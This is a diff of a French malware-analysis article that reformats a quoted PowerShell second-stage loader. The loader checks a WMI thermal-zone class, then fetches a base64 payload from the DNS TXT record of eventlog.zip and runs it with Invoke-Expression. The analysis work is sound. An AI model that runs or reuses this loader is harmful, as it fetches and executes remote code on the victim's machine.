@@ -168,7 +168,11 @@ La partie la plus importante du script est celle qui va charger en mémoire et r
 Une fois que vous exécutez cela dans un IDE (powershell ou tio.run par exemple), vous allez avoir le stage 2 qui va apparaitre:
 
 ```ps1
-try {$TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue' ; if ($error.Count -eq 0) { $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
+try {
+    $TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue' ; 
+    if ($error.Count -eq 0) { 
+        $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); 
+    if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
 ```
 
 Le stage2 peut faire peur, mais au final, il est extrêmement simple à comprendre, en effet, il se réduit à une résolution DNS pour récupérer un champ TXT d'un domaine.
